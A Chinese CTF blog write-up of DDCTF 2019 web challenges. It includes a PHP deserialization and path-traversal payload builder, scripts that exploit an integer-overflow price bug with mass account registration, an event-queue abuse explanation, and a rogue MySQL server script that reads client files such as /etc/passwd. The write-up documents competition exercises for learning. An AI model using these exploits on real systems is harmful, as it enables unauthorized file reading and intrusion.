---
title: 2019 DDCTF web
author: ch4ser
date: 2019-05-11 13:58:05
categories:
  - CTF
typora-root-url: ../
cover:
  image: image-20211114142123083.png
---

考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。

## web 签到题

点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送``Auth.php``请求，其中有``didictf_username``字段，尝试添加成为``didictf_username: admin``。成功登陆。

然后在返回包中显示出了一个``php文件``，尝试访问看到了``Session.php``的源代码如下：

```php

<?php
Class Application {
  var $path = '';


  public function response($data, $errMsg = 'success') {
      $ret = ['errMsg' => $errMsg,
          'data' => $data];
      $ret = json_encode($ret);
      header('Content-type: application/json');
      echo $ret;

  }

  public function auth() {
      $DIDICTF_ADMIN = 'admin';
      if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
          $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
          return TRUE;
      }else{
          $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
          exit();
      }

  }
  private function sanitizepath($path) {
  $path = trim($path);//去掉空格
  $path=str_replace('../','',$path);//过滤第一
  $path=str_replace('..\\','',$path);//过滤第二
  return $path;
}//

public function __destruct() {
  if(empty($this->path)) {
      exit();
  }else{
      $path = $this->sanitizepath($this->path);// ....//config/flag.php
      if(strlen($path) !== 18) {//../config/flag.php
          exit();
      }
      $this->response($data=file_get_contents($path),'Congratulations');
  }
  exit();
}
}
?>


<?php
include 'Application.php';
class Session extends Application {

  //key建议为8位字符串
  var $eancrykey                  = '';
  var $cookie_expiration			= 7200;
  var $cookie_name                = 'ddctf_id';
  var $cookie_path				= '';
  var $cookie_domain				= '';
  var $cookie_secure				= FALSE;
  var $activity                   = "DiDiCTF";


  public function index()
  {
	if(parent::auth()) {
          $this->get_key();
          if($this->session_read()) {
              $data = 'DiDI Welcome you %s';
              $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
              parent::response($data,'sucess');
          }else{
              $this->session_create();
              $data = 'DiDI Welcome you';
              parent::response($data,'sucess');
          }
      }

  }

  private function get_key() {
      //eancrykey  and flag under the folder
      $this->eancrykey =  file_get_contents('../config/key.txt');
  }

  public function session_read() {//target1: 绕过所有false
      if(empty($_COOKIE)) {
           return FALSE;
      }//cookie not empty

      $session = $_COOKIE[$this->cookie_name];
      if(!isset($session)) {
          parent::response("session not found",'error');
          return FALSE;
      }//ddctf_id 不能为空

      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位

      if($hash !== md5($this->eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
          parent::response("the cookie data not match",'error');
          return FALSE;
      }
      $session = unserialize($session);//ddctf_id 反序列化


      if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
          return FALSE;
      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??

      if(!empty($_POST["nickname"])) {
          $arr = array($_POST["nickname"],$this->eancrykey);
          $data = "Welcome my friend %s";
          foreach ($arr as $k => $v) {
              $data = sprintf($data,$v);
          }
          parent::response($data,"Welcome");
      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。

      if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
          parent::response('the ip addree not match'.'error');
          return FALSE;
      }//ip_address 要写自己的ip

      if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
          parent::response('the user agent not match','error');
          return FALSE;
      }//user_agent 内容要和 http_user_agent的匹配
      return TRUE;

  }//看起来可以动手脚的只有session_id?

  private function session_create() {
      $sessionid = '';
      while(strlen($sessionid) < 32) {
          $sessionid .= mt_rand(0,mt_getrandmax());
      }

      $userdata = array(
          'session_id' => md5(uniqid($sessionid,TRUE)),
          'ip_address' => $_SERVER['REMOTE_ADDR'],
          'user_agent' => $_SERVER['HTTP_USER_AGENT'],
          'user_data' => '',
      );

      $cookiedata = serialize($
  );
      $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
      $expire = $this->cookie_expiration + time();
      setcookie(
          $this->cookie_name,
          $cookiedata,
          $expire,
          $this->cookie_path,
          $this->cookie_domain,
          $this->cookie_secure
          );

  }
}


$ddctf = new Session();
$ddctf->index();
?>
```
得到``key``之后构造ddctfid:
```php
<?php
//nickname = %s

$a = 'a:4:{s:10:"session_id";s:32:"3f65fc339c032f85048e42f21fab4ef0";s:10:"ip_address";s:14:"211.137.22.191";s:10:"user_agent";s:78:"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";s:9:"user_data";s:0:"";}';

$b = unserialize($a);

class Application{
  public $path = '....//config/flag.txt';
}

$key = 'EzblrbNS';
$b['user_data'] = new Application;

$d = serialize($b);
echo urlencode($d.md5($key.$d));
```
传参即可。
## 大吉大利今晚吃鸡

遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出``0xffffffff+1``，传参进去就买到了。
然后要淘汰100个人，实际上要淘汰149个人。脚本如下：

```python
import requests
import string
import random
import json
import re

url = 'http://117.51.147.155:5050'
seq = [
  'register',
  'login',
  'balance',
  'search_ticket',
  'bill',
  'buy',
  'bill',
   'pay']

url_seg = {
  'register':'/ctf/api/register?name={0}&password=11111111',
  'login':'/ctf/api/login?name={0}&password=11111111',
  'balance':'/ctf/api/get_user_balance',
  'search_ticket':'/ctf/api/search_ticket',
  'bill':'/ctf/api/search_bill_info',
  'buy':'/ctf/api/buy_ticket?ticket_price=4294967296',
  'remove':'/ctf/api/remove_robot?id={0}&ticket={1}',
  'pay':'/ctf/api/pay_ticket?bill_id={0}'}

session = requests.session()

victiom ={
 1: '21cb23b38e33426812d68991dbb6ba68',
 2: '6f89be1e66c9bd69bce99952aa009a96',
 3: '70e1b0196609646efd0aacea613943d6',
 4: '46f7f7e50b54a636f3aae60dd839590b',
 5: '395b9fb4fb0f3cf42a727d43536be457',
 ···
 ···
 147: '4cc522f84f11189d9737ab18fc22fcd0',
 148: '8f2675372aa0f2ecfee1aeeee3d814cd',
 149: '7544b9ee45ae6ae7066305d472077638'}

def register_login_get_ticket():
  global victiom 
  global session
  while True:
      username = random.sample(string.letters, 19)    
      username1 = ''.join(username)
      register1 = url_seg['register'].format(str(username1))
      reg_url = url + register1
      print reg_url
      res = session.get(reg_url).content
      if '\u7528\u6237\u6ce8\u518c\u6210\u529f' in res:
          log_url = url + url_seg['login'].format(username1)
          session.get(log_url)
          buy_url = url + url_seg['buy']
          res = session.get(buy_url).content
          bill_url = url + url_seg['bill']
          html = session.get(bill_url)
          jsonn = json.loads(html.text)
          bill_id = jsonn['data'][0]['bill_id']
          pay_url = url + url_seg['pay'].format(bill_id)
          session.get(pay_url)
          sear_url = url + url_seg['search_ticket']
          html = session.get(sear_url)
          res = html.content
          josnn = json.loads(html.text)
          id = josnn['data'][0]['id']
          # 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式
          ticket = re.search("ticket\":\"(.*?)\"", res).group(1)
          victiom[id] = ticket
          print victiom
          if len(victiom) == 149:
              break


def delete_other():
  session = requests.session()
  regiter1  = url_seg['register'].format('ch5ser_cqw_cq')
  reg_url = url + regiter1
  res = session.get(reg_url).content
  if '\u7528\u6237\u6ce8\u518c\u6210\u529f' in res:
          log_url = url + url_seg['login'].format('ch5ser_cqw_cq')
          session.get(log_url)
          buy_url = url + url_seg['buy']
          res = session.get(buy_url).content
          bill_url = url + url_seg['bill']
          html = session.get(bill_url)
          jsonn = json.loads(html.text)
          bill_id = jsonn['data'][0]['bill_id']
          pay_url = url + url_seg['pay'].format(bill_id)
          session.get(pay_url)
          sear_url = url + url_seg['search_ticket']
          html = session.get(sear_url)
          for key, value in victiom.items():    
              remove = url_seg['remove'].format(str(key), value)
              rem_url = url + remove
              print session.get(rem_url).content

  print session.get("http://117.51.147.155:5050/ctf/api/get_flag").content


def main():
  # 注册过快可能会被封
  register_login_get_ticket()
  delete_other()


if __name__ == '__main__':
  main()
```

学长的脚本
```python
import requests

import json
def reg():
  for i in range(0,1000):
      url = "http://117.51.147.155:5050/ctf/api/register?name=cic"+str(i)+"&password=12345678"
      html = requests.get(url)
      print(html.text)
def get_ticket(i):

      s = requests.session()
      s.get("http://117.51.147.155:5050/ctf/api/login?name=cic"+str(i)+"&password=12345678")
      html = s.get("http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296")
      json1 = json.loads(html.text)
      ticketid = json1["data"][0]["bill_id"]
      html1 = s.get("http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="+ticketid)
      html2 = s.get("http://117.51.147.155:5050/ctf/api/search_ticket")
      json2 = json.loads(html2.text)
      id = json2["data"][0]["id"]
      ticket = json2["data"][0]["ticket"]

      pack = {"id":id , "ticket":ticket}
      return pack
def del_people(id,ticket):
  s = requests.session()
  s.get("http://117.51.147.155:5050/ctf/api/login?name=cic&password=12345678")
  html = s.get("http://117.51.147.155:5050/ctf/api/remove_robot?id="+str(id)+"&ticket="+ticket)
  print(html.text)
if __name__ == '__main__':
  reg()
  #get_ticket()
  for i in range(0,1000):
      pack = get_ticket(i)
      id = pack["id"]
      ticket = pack["ticket"]
      print(id)
      print(ticket)
      del_people(id, ticket)
      #del_people(id,ticket)

```
## 滴
沙雕题目，要读取的文件``.practice.txt.swp``在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了
## 图片上传

上传一张图片，提示缺少字段``phpinfo()``,并显示出了上传后的图片，下载后放入``010editor``中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加``phpinfo()``上传就有flag了。
## homebrew event loop

read the source code first
```python
# -*- encoding: utf-8 -*-
# written in python 3.7
__author__ = 'garzon'

from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = '*********************' # censored
url_prefix = '/d5af31f66741e857'

def FLAG():
  return 'FLAG_is_here_but_i_wont_show_you'  # censored

# put event in a queue
def trigger_event(event):
  session['log'].append(event)
  if len(session['log']) > 5: session['log'] = session['log'][-5:]
  if type(event) == type([]):
      request.event_queue += event
  else:
      request.event_queue.append(event)

# get the string between prefix and postfix
def get_mid_str(haystack, prefix, postfix=None):
  haystack = haystack[haystack.find(prefix)+len(prefix):]
  if postfix is not None:
      haystack = haystack[:haystack.find(postfix)]
  return haystack
  
class RollBackException: pass

def execute_event_loop():
  valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
  resp = None
  # handle a event everytime
  while len(request.event_queue) > 0:
      event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
      request.event_queue = request.event_queue[1:]
      if not event.startswith(('action:', 'func:')): continue
      for c in event:
          if c not in valid_event_chars: break
      else:
          is_action = event[0] == 'a'
          action = get_mid_str(event, ':', ';')
          args = get_mid_str(event, action+';').split('#')
          try:
              # trigger_event%23;get_flag
              # 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。
              event_handler = eval(action + ('_handler' if is_action else '_function'))
              ret_val = event_handler(args)
          except RollBackException:
              if resp is None: resp = ''
              resp += 'ERROR! All transactions have been cancelled. <br />'
              resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
              session['num_items'] = request.prev_session['num_items']
              session['points'] = request.prev_session['points']
              break
          except Exception, e:
              if resp is None: resp = ''
              #resp += str(e) # only for debugging
              continue
          if ret_val is not None:
              if resp is None: resp = ret_val
              else: resp += ret_val
  if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
  session.modified = True
  return resp
  
@app.route(url_prefix+'/')
def entry_point():
  querystring = urllib.unquote(request.query_string)
  request.event_queue = []
  if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
      querystring = 'action:index;False#False'
  if 'num_items' not in session:
      session['num_items'] = 0
      session['points'] = 3
      session['log'] = []
  request.prev_session = dict(session)
  trigger_event(querystring)
  return execute_event_loop()

# handlers/functions below --------------------------------------

def view_handler(args):
  page = args[0]
  html = ''
  html += '[INFO] you have {} diamonds, {} points now.<br />'.format(session['num_items'], session['points'])
  if page == 'index':
      html += '<a href="./?action:index;True%23False">View source code</a><br />'
      html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
      html += '<a href="./?action:view;reset">Reset</a><br />'
  elif page == 'shop':
      html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
  elif page == 'reset':
      del session['num_items']
      html += 'Session reset.<br />'
  html += '<a href="./?action:view;index">Go back to index.html</a><br />'
  return html

def index_handler(args):
  bool_show_source = str(args[0])
  bool_download_source = str(args[1])
  if bool_show_source == 'True':
  
      source = open('eventLoop.py', 'r')
      html = ''
      if bool_download_source != 'True':
          html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
          html += '<a href="./?action:view;index">Go back to index.html</a><br />'
          
      for line in source:
          if bool_download_source != 'True':
              html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('<', '&lt;').replace('>','&gt;').replace('\n', '<br />')
          else:
              html += line
      source.close()
      
      if bool_download_source == 'True':
          headers = {}
          headers['Content-Type'] = 'text/plain'
          headers['Content-Disposition'] = 'attachment; filename=serve.py'
          return Response(html, headers=headers)
      else:
          return html
  else:
      trigger_event('action:view;index')
      
def buy_handler(args):
  num_items = int(args[0])
  if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
  session['num_items'] += num_items 
  trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])
  
def consume_point_function(args):
  point_to_consume = int(args[0])
  if session['points'] < point_to_consume: raise RollBackException()
  session['points'] -= point_to_consume
  
def show_flag_function(args):
  flag = args[0]
  #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
  return 'You naughty boy! ;) <br />'
  
def get_flag_handler(args):
  if session['num_items'] >= 5:
      trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries
  trigger_event('action:view;index')
  
if __name__ == '__main__':
  app.run(debug=False, host='0.0.0.0') 
```

![Screenshot from 2019-04-29 17-29-27](https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png)

![Screenshot from 2019-04-29 17-28-05](https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png)

![Screenshot from 2019-04-29 17-28-36](https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png)

这里有个点有疑问：
- 为什么``get_flag_handle``函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。
  
  值得注意的是，``get_flag_handle`` 和 ``buy``函数是在``consume_point_function``执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将``buy``和``get_flag``函数插入在``consume_point_function``前面的话，他们会先执行并获取到``flag``， 注意到``trigger_event``会将flag放进``log``之中去并放在``session``中显示回来。
## mysql弱口令


![QQ截图20190511214737](https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png)


客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。

题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 ``result = [{'local_address':"0.0.0.0:3306",'Process_name':"1234/mysqld"}]``，这样就可以绕过客户端的验证了。

然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。
脚本如下：

```python
import socket

host = '0.0.0.0'
port = 3306

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((host,port))

server.listen(5)

# filename = '/etc/passwd'
filename = '~/.mysql_history'

greeting = "5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400".decode('hex')

login_conf = "0700000200000002000000".decode('hex')

# 这里的chr值得注意
evil_request = chr(len(filename) + 1)+"\x00\x00\x01\xfb"+filename

conn, addr = server.accept()
conn.send(greeting)
print conn.recv(9999)
conn.send(login_conf)
print conn.recv(9999)
conn.send(evil_request)
print conn.recv(9999)
```

三个发送的东西分别对应如下：
- greeting
  
  ![Screenshot from 2019-05-11 15-31-17](https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png)
- 登录通过包
  
  ![Screenshot from 2019-05-11 15-35-00](https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png)
- 文件回显包
  
  ![Screenshot from 2019-05-11 15-49-14](https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png)
  
  同时运行经过修改后的``agent.py``和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag
  
  ![Screenshot from 2019-05-11 16-30-14](https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png)
  
  参考 ：
  [https://xz.aliyun.com/t/3277](https://xz.aliyun.com/t/3277)
  
  [http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)
  
  [https://www.anquanke.com/post/id/106488](https://www.anquanke.com/post/id/106488)
## wireshark

拿到数据包，打开，设置过滤条件``http``，可以看到这里有图片流量。使用``file->export objects->http``来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。

![Screenshot from 2019-05-11 22-18-49](https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png){:height 684, :width 766}


在``wireshark``中追踪TCP流，发现最开始访问了一个图片加密的网站。

![Screenshot from 2019-05-11 22-22-25](https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png)

进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。

![x](https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png)

![Screenshot from 2019-05-11 15-24-45](https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png)
